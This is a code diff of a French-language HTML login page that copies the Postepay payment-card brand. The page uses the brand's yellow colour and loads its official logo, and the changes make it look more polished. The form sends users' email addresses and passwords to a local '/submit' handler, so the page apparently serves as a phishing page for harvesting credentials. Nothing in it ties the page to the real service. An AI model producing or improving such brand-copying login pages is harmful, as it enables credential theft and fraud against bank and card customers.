@@ -2,10 +2,10 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Connexion Postepay</title>
+  <title>Postepay Connexion</title>
   <style>
     body {
-      background-color: #fff400; /* Jaune Postepay */
+      background-color: #fff400;
       font-family: Arial, sans-serif;
       display: flex;
       flex-direction: column;
@@ -15,10 +15,16 @@
       margin: 0;
     }
 
+    img {
+      width: 150px;
+      margin-bottom: 20px;
+    }
+
     h1 {
-      font-size: 2.5em;
+      font-size: 2em;
       color: #000;
-      margin-bottom: 30px;
+      margin-bottom: 20px;
+      text-align: center;
     }
 
     form {
@@ -49,6 +55,7 @@
       font-size: 1em;
       border-radius: 5px;
       cursor: pointer;
+      margin-top: 10px;
     }
 
     button:hover {
@@ -58,12 +65,15 @@
 </head>
 <body>
 
+  <!-- Logo officiel Postepay (chargé depuis internet) -->
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e5/Postepay_logo_2018.svg/2560px-Postepay_logo_2018.svg.png" alt="Logo Postepay">
+
   <h1>Bienvenue sur Postepay</h1>
 
   <form action="/submit" method="POST">
-    <input type="text" name="email" placeholder="Identifiant" required>
+    <input type="email" name="email" placeholder="Adresse email" required>
     <input type="password" name="password" placeholder="Mot de passe" required>
-    <button type="submit">Connexion</button>
+    <button type="submit">Se connecter</button>
   </form>
 
 </body>
